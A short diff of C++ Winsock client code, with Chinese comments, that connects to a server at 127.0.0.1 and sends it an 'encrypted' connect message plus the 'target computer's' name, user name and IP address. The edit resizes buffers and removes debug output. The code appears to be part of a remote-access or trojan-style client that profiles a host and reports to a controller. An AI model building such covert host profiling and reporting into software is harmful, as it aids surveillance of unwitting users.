@@ -24,9 +24,9 @@ int main()
 
 	SOCKET fd = CreatClientScoket("127.0.0.1");//连接
 
-	char str[] = "connect success";//连接成功
+	char str[BUFSIZ] = "connect success";//连接成功
 	encode(str);
-	send(fd, str, strlen(str), 0);
+	send(fd, str, BUFSIZ, 0);
 	Sleep(200);
 
 	GetPCMessage(fd);//将PC信息发送给服务端
@@ -114,7 +114,7 @@ int main()
 
 int GetPCMessage(SOCKET fd)
 {
-	PC_Message msg;//定义msg结构体
+	PC_Message msg = { {0}, {0}, {0} };//定义msg结构体
 	char UserName[BUFSIZ] = { 0 };//定义和初始化
 
 	if (getmessage(&msg) == false)//获取目标计算机的IP，计算机名以及用户名
@@ -126,21 +126,15 @@ int GetPCMessage(SOCKET fd)
 	encode(msg.PCName);//加密
 	//cout << msg.PCName << endl;
 	encode(UserName);
-	cout << strlen(msg.PCName) << endl;
 	cout << UserName << endl;
-	cout << strlen(UserName) << endl;
 	encode(msg.IP);
-	cout << strlen(msg.IP) << endl;
 	//cout << msg.IP << endl;
 
-	send(fd, msg.PCName, strlen(msg.PCName), 0);
-	Sleep(200);
+	send(fd, msg.PCName, BUFSIZ, 0);
 	
-	send(fd, UserName, strlen(UserName), 0);
-	Sleep(200);
+	send(fd, UserName, BUFSIZ, 0);
 	
-	send(fd, msg.IP, strlen(msg.IP), 0);
-	Sleep(200);
+	send(fd, msg.IP, BUFSIZ, 0);
 	
 	return 0;
 }
